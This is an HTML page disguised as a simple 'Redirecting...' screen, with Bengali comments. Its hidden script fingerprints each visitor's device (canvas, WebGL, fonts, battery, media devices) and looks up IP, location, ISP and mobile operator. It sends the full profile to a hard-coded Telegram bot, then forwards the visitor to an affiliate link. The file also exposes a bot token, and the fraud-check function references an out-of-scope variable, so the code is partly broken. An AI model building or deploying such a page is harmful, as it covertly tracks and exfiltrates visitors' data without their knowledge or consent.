<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: #0d1117; color: #c9d1d9; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 40px; max-width: 420px; width: 100%; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
        .spinner { width: 48px; height: 48px; border: 4px solid #30363d; border-top-color: #58a6ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h3 { font-size: 20px; margin-bottom: 10px; color: #f0f6fc; }
        p { color: #8b949e; font-size: 14px; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h3>⏳ Redirecting...</h3>
        <p>Please wait, you will be redirected automatically.</p>
    </div>

    <script>
        // ========== আপনার টেলিগ্রাম বট তথ্য দিন ==========
        const TG_BOT_TOKEN = "8651142215:AAHuKP53rRExlvBipq2EgcXWCOU4i-vZ7Do";
        const TG_CHAT_ID = "5575068712";
        const REDIRECT_URL = "https://coldredir.com/L?tag=d_5695957m_126646c_&site=5695957&ad=126646";
        // ===================================================

        // ========== SHA-256 হ্যাশ ফাংশন ==========
        async function sha256(message) {
            const msgBuffer = new TextEncoder().encode(message);
            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        }

        // ========== ফন্ট ডিটেকশন ==========
        function detectFonts() {
            const fonts = [
                'Arial','Verdana','Times New Roman','Courier New','Helvetica',
                'Tahoma','Georgia','Comic Sans MS','Impact','Lucida Console',
                'Segoe UI','Roboto','Open Sans','Noto Sans','Ubuntu','Calibri'
            ];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const testStr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            
            ctx.font = '16px monospace';
            const baseWidth = ctx.measureText(testStr).width;
            
            const found = [];
            fonts.forEach(font => {
                ctx.font = '16px ' + font;
                const w = ctx.measureText(testStr).width;
                if (Math.abs(w - baseWidth) > 2) found.push(font);
            });
            return found.join(',');
        }

        // ========== ব্যাটারি ফিঙ্গারপ্রিন্ট ==========
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Yes' : 'No',
                        chargingTime: battery.chargingTime === Infinity ? 'Infinity' : battery.chargingTime + 's',
                        dischargingTime: battery.dischargingTime === Infinity ? 'Infinity' : battery.dischargingTime + 's'
                    };
                }
            } catch(e) {}
            return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
        }

        // ========== ওয়েবজিএল ডিটেইলস ==========
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const di = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        vendor: di ? gl.getParameter(di.UNMASKED_VENDOR_WEBGL) : 'N/A',
                        renderer: di ? gl.getParameter(di.UNMASKED_RENDERER_WEBGL) : 'N/A',
                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS).join('x'),
                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                        version: gl.getParameter(gl.VERSION)
                    };
                }
            } catch(e) {}
            return { vendor: 'N/A', renderer: 'N/A', maxTextureSize: 'N/A', maxViewportDims: 'N/A', shadingLanguageVersion: 'N/A', version: 'N/A' };
        }

        // ========== ক্যানভাস ফিঙ্গারপ্রিন্ট ==========
        function getCanvasFP() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 256;
                canvas.height = 100;
                
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 256, 100);
                ctx.fillStyle = '#069';
                ctx.font = 'bold 20px monospace';
                ctx.fillText('C' + String.fromCharCode(169) + 'p' + String.fromCharCode(174) + 'y', 2, 2);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.font = 'bold 26px sans-serif';
                ctx.fillText('right', 4, 45);
                ctx.fillStyle = '#fff';
                ctx.font = '16px Georgia';
                ctx.fillText(' © 2025', 4, 78);
                
                const gradient = ctx.createLinearGradient(0, 0, 256, 100);
                gradient.addColorStop(0, '#ff0000');
                gradient.addColorStop(0.5, '#00ff00');
                gradient.addColorStop(1, '#0000ff');
                ctx.fillStyle = gradient;
                ctx.globalCompositeOperation = 'lighter';
                ctx.fillRect(50, 20, 150, 40);
                
                return canvas.toDataURL();
            } catch(e) { return 'canvas_error'; }
        }

        // ========== বাংলাদেশি মোবাইল অপারেটর শনাক্তকরণ ==========
        function detectBangladeshiOperator(ispName) {
            if (!ispName) return 'Unknown';
            const name = ispName.toLowerCase();
            
            // ISP নাম থেকে অপারেটর চিহ্নিত
            if (name.includes('grameenphone') || name.includes('gp')) return 'Grameenphone (GP)';
            if (name.includes('robi') || name.includes('airtel')) return 'Robi / Airtel';
            if (name.includes('banglalink') || name.includes('bl')) return 'Banglalink';
            if (name.includes('teletalk')) return 'Teletalk';
            if (name.includes('skitto')) return 'Skitto (GP)';
            
            // মোবাইল নম্বর প্রিফিক্স থেকে (যদি msisdn থাকে)
            return 'Broadband / WiFi';
        }

        // ========== প্রধান ফিঙ্গারপ্রিন্ট ফাংশন ==========
        async function generateFingerprint() {
            const canvasFP = getCanvasFP();
            const glInfo = getWebGLInfo();
            const battery = await getBatteryInfo();
            const fonts = detectFonts();
            
            let screenDetails = {};
            try {
                if (window.screen && window.screen.isExtended) {
                    screenDetails.isExtended = window.screen.isExtended;
                }
                screenDetails.wakeLockSupport = 'wakeLock' in navigator;
            } catch(e) {}
            
            let mediaDevices = [];
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                mediaDevices = devices.map(d => d.kind + ':' + d.label.substring(0, 30));
            } catch(e) { mediaDevices = ['N/A']; }
            
            let connection = {};
            try {
                if (navigator.connection) {
                    connection = {
                        type: navigator.connection.effectiveType || 'N/A',
                        downlink: navigator.connection.downlink || 'N/A',
                        rtt: navigator.connection.rtt || 'N/A',
                        saveData: navigator.connection.saveData || false
                    };
                }
            } catch(e) {}
            
            const rawParts = [
                canvasFP,
                glInfo.vendor,
                glInfo.renderer,
                glInfo.maxTextureSize,
                glInfo.maxViewportDims,
                glInfo.shadingLanguageVersion,
                screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
                screen.availWidth + 'x' + screen.availHeight,
                navigator.hardwareConcurrency || 'N/A',
                navigator.deviceMemory || 'N/A',
                navigator.platform || 'N/A',
                navigator.language || 'N/A',
                navigator.languages ? navigator.languages.join(',') : 'N/A',
                Intl.DateTimeFormat().resolvedOptions().timeZone,
                navigator.maxTouchPoints,
                fonts,
                battery.level,
                battery.charging,
                connection.type || 'N/A',
                connection.downlink || 'N/A',
                screenDetails.isExtended || false,
                screenDetails.wakeLockSupport || false,
                mediaDevices.join('|')
            ];
            
            const rawString = rawParts.join('|||');
            const fpHash = await sha256(rawString);
            
            return {
                hash: fpHash,
                raw: rawParts,
                glInfo: glInfo,
                battery: battery,
                connection: connection,
                fonts: fonts,
                mediaDevices: mediaDevices,
                screenDetails: screenDetails
            };
        }

        // ========== আইপি ফেচ ==========
        async function getIP() {
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const data = await resp.json();
                return data.ip;
            } catch(e) {
                try {
                    const resp2 = await fetch('https://api.myip.com');
                    const data2 = await resp2.json();
                    return data2.ip;
                } catch(e2) {
                    return 'Unavailable';
                }
            }
        }

        // ========== লোকেশন + ISP + অপারেটর ডিটেকশন ==========
        async function getLocation(ip) {
            try {
                const resp = await fetch('https://ipapi.co/' + ip + '/json/');
                const data = await resp.json();
                
                const isp = data.org || 'N/A';
                const operator = detectBangladeshiOperator(isp);
                
                return {
                    country: data.country_name || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || 'N/A',
                    isp: isp,
                    operator: operator,
                    timezone: data.timezone || 'N/A',
                    countryCode: data.country_code || 'N/A'
                };
            } catch(e) {
                return { country: 'N/A', city: 'N/A', region: 'N/A', isp: 'N/A', operator: 'N/A', timezone: 'N/A', countryCode: 'N/A' };
            }
        }

        // ========== ফ্রড ডিটেকশন ইঞ্জিন ==========
        function detectFraud(fpHash, location, connection, ua, glInfo) {
            let fraudScore = 0;
            const reasons = [];
            
            // 1. localStorage-এ আগের ফিঙ্গারপ্রিন্ট চেক
            let isSameDevice = false;
            try {
                const storedHash = localStorage.getItem('fp_hash_master');
                if (storedHash && storedHash === fpHash) {
                    fraudScore += 3;
                    reasons.push('একই ফিঙ্গারপ্রিন্ট (পূর্বে রেকর্ডকৃত)');
                    isSameDevice = true;
                }
            } catch(e) {}
            
            // 2. একাধিকবার ভিজিট চেক (কাউন্টার)
            try {
                let visitCount = parseInt(localStorage.getItem('fp_visit_count') || '0');
                visitCount++;
                localStorage.setItem('fp_visit_count', visitCount.toString());
                if (visitCount > 3) {
                    fraudScore += 1;
                    reasons.push('একাধিক ভিজিট (' + visitCount + ' বার)');
                }
            } catch(e) {}
            
            // 3. Headless ব্রাউজার ডিটেক্ট
            if (navigator.webdriver) {
                fraudScore += 3;
                reasons.push('WebDriver সক্রিয় (Headless/Bot)');
            }
            if (ua.includes('HeadlessChrome')) {
                fraudScore += 3;
                reasons.push('HeadlessChrome ডিটেক্ট');
            }
            
            // 4. ভার্চুয়াল মেশিন / এমুলেটর ডিটেক্ট
            if (glInfo.renderer.includes('VMware') || glInfo.renderer.includes('VirtualBox') || 
                glInfo.renderer.includes('Microsoft Basic Render') || glInfo.renderer.includes('llvmpipe')) {
                fraudScore += 2;
                reasons.push('VM/এমুলেটর GPU ডিটেক্ট (' + glInfo.renderer.substring(0, 30) + ')');
            }
            
            // 5. প্রাইভেসি সেটিংস
            if (navigator.doNotTrack === '1') {
                fraudScore += 1;
                reasons.push('Do Not Track সক্রিয়');
            }
            
            // 6. স্ক্রিন রেজোলিউশন অস্বাভাবিকতা
            if (screen.width === 0 || screen.height === 0) {
                fraudScore += 2;
                reasons.push('অস্বাভাবিক স্ক্রিন রেজোলিউশন');
            }
            
            // 7. ব্যাটারি চেক — যদি ব্যাটারি API না থাকে (কিছু হেডলেস ব্রাউজারে)
            if (fp.includes('N/A') && fp.includes('N/A')) {
                // ব্যাটারি না পেলে স্কোর বাড়ে না, কারণ কিছু ব্রাউজারে API নাও থাকতে পারে
            }
            
            // 8. সিম/নেটওয়ার্ক অসঙ্গতি
            if (location.countryCode === 'BD' && connection.type === 'wifi' && location.operator === 'Unknown') {
                // বাংলাদেশে WiFi ব্যবহার করলে অপারেটর না পেলেই সমস্যা না
            }
            
            // সিদ্ধান্ত
            let verdict = '🟢 রিয়েল';
            let verdictEmoji = '✅';
            if (fraudScore >= 5) {
                verdict = '🔴 ফ্রড';
                verdictEmoji = '🚫';
            } else if (fraudScore >= 3) {
                verdict = '🟡 সন্দেহজনক';
                verdictEmoji = '⚠️';
            }
            
            return {
                score: fraudScore,
                verdict: verdict,
                verdictEmoji: verdictEmoji,
                reasons: reasons,
                isSameDevice: isSameDevice
            };
        }

        // ========== মেইন এক্সিকিউশন ==========
        (async function() {
            const fp = await generateFingerprint();
            const publicIP = await getIP();
            const location = await getLocation(publicIP);
            
            // ===== ইউজার এজেন্ট বিশ্লেষণ =====
            const ua = navigator.userAgent;
            let browserName = 'Unknown';
            if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
            else if (ua.includes('Firefox')) browserName = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
            else if (ua.includes('Edg')) browserName = 'Edge';
            else if (ua.includes('OPR') || ua.includes('Opera')) browserName = 'Opera';
            else if (ua.includes('MiuiBrowser')) browserName = 'MIUI Browser';
            else if (ua.includes('UCBrowser')) browserName = 'UC Browser';
            
            let osName = 'Unknown';
            if (ua.includes('Windows NT 10.0')) osName = 'Windows 10/11';
            else if (ua.includes('Windows NT 6.3')) osName = 'Windows 8.1';
            else if (ua.includes('Windows NT 6.1')) osName = 'Windows 7';
            else if (ua.includes('Android')) osName = 'Android ' + (ua.match(/Android\s([\d.]+)/) || [''])[1];
            else if (ua.includes('iPhone')) osName = 'iOS ' + (ua.match(/OS\s([\d_]+)/) || [''])[1].replace(/_/g, '.');
            else if (ua.includes('Mac OS X')) osName = 'macOS';
            else if (ua.includes('Linux')) osName = 'Linux';
            
            // ===== প্রাইভেসি চেক =====
            const privacyFlags = [];
            if (navigator.doNotTrack === '1' || navigator.doNotTrack === 'yes') privacyFlags.push('DNT:Yes');
            if (navigator.webdriver === true) privacyFlags.push('WebDriver:Yes');
            try {
                document.cookie = 'testcookie=1; SameSite=Lax';
                if (document.cookie.indexOf('testcookie') === -1) privacyFlags.push('Cookies:Blocked');
                else document.cookie = 'testcookie=; expires=Thu, 01 Jan 1970 00:00:00 GMT';
            } catch(e) { privacyFlags.push('Cookies:Error'); }

            // ===== ফ্রড ডিটেকশন =====
            const fraudResult = detectFraud(fp.hash, location, fp.connection, ua, fp.glInfo);
            
            // ===== পূর্ববর্তী ফিঙ্গারপ্রিন্ট সংরক্ষণ (মাস্টার কপি) =====
            try {
                if (!localStorage.getItem('fp_hash_master')) {
                    localStorage.setItem('fp_hash_master', fp.hash);
                    localStorage.setItem('fp_first_visit', new Date().toISOString());
                }
            } catch(e) {}

            // ===== টেলিগ্রাম মেসেজ তৈরি =====
            // অপারেটর/নেটওয়ার্ক লাইন
            let networkLine = '';
            if (location.operator !== 'Broadband / WiFi' && location.operator !== 'Unknown') {
                networkLine = `📡 **নেটওয়ার্ক:** ${location.operator} (${fp.connection.type || 'N/A'}, ${fp.connection.downlink || '?'}Mbps)`;
            } else if (location.operator === 'Broadband / WiFi') {
                networkLine = `📡 **নেটওয়ার্ক:** ${location.isp.substring(0, 40)} (WiFi/Broadband, ${fp.connection.type || 'N/A'})`;
            } else {
                networkLine = `📡 **নেটওয়ার্ক:** ${location.isp.substring(0, 40)} (${fp.connection.type || 'N/A'})`;
            }

            const msg = 
`${fraudResult.verdictEmoji} **ভিজিটর রিপোর্ট** ${fraudResult.verdictEmoji}
━━━━━━━━━━━━━━━━━━
**রেজাল্ট: ${fraudResult.verdict}**
📊 **ফ্রড স্কোর:** ${fraudResult.score}/10
${fraudResult.reasons.length > 0 ? '🔍 **কারণ:** ' + fraudResult.reasons.join(', ') : ''}
━━━━━━━━━━━━━━━━━━
🆔 **FP:** \`${fp.hash.substring(0, 24)}...\`
━━━━━━━━━━━━━━━━━━
🌐 **IP:** ${publicIP}
📍 **লোকেশন:** ${location.city}, ${location.country}
🏢 **ISP:** ${location.isp.substring(0, 50)}
${networkLine}
━━━━━━━━━━━━━━━━━━
📱 **প্ল্যাটফর্ম:** ${navigator.platform}
💻 **ওএস:** ${osName}
🌍 **ব্রাউজার:** ${browserName}
📺 **স্ক্রিন:** ${screen.width}x${screen.height} (${screen.availWidth}x${screen.availHeight})
🎨 **কালার:** ${screen.colorDepth}-bit
━━━━━━━━━━━━━━━━━━
🧠 **র‍্যাম:** ${navigator.deviceMemory || 'N/A'}GB
⚡ **কোর:** ${navigator.hardwareConcurrency || 'N/A'}
👆 **টাচ:** ${navigator.maxTouchPoints} পয়েন্ট
🔋 **ব্যাটারি:** ${fp.battery.level} | ${fp.battery.charging === 'Yes' ? 'চার্জিং' : 'চার্জিং নয়'}
━━━━━━━━━━━━━━━━━━
🎮 **GPU:** ${fp.glInfo.renderer.substring(0, 50)}
🔤 **ফন্টস:** ${fp.fonts.split(',').length}টি ইনস্টল
━━━━━━━━━━━━━━━━━━
🌍 **টাইমজোন:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🗣 **ভাষা:** ${navigator.language}
📶 **কানেকশন:** ${fp.connection.type || 'N/A'} (${fp.connection.downlink || '?'}Mbps, RTT: ${fp.connection.rtt || '?'}ms)
━━━━━━━━━━━━━━━━━━
🔒 **প্রাইভেসি:** ${privacyFlags.join(', ') || 'Normal'}
📷 **মিডিয়া ডিভাইস:** ${fp.mediaDevices.length}টি পাওয়া
🕒 **সময়:** ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}
━━━━━━━━━━━━━━━━━━
**UA:** \`${ua.substring(0, 120)}\``;

            // টেলিগ্রামে পাঠান
            fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: msg,
                    parse_mode: 'Markdown'
                })
            }).catch(function(err) { console.log('TG Error:', err); });

            // ===== ২ সেকেন্ড পর রিডাইরেক্ট =====
            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, 2000);
        })();
    </script>
</body>
</html>
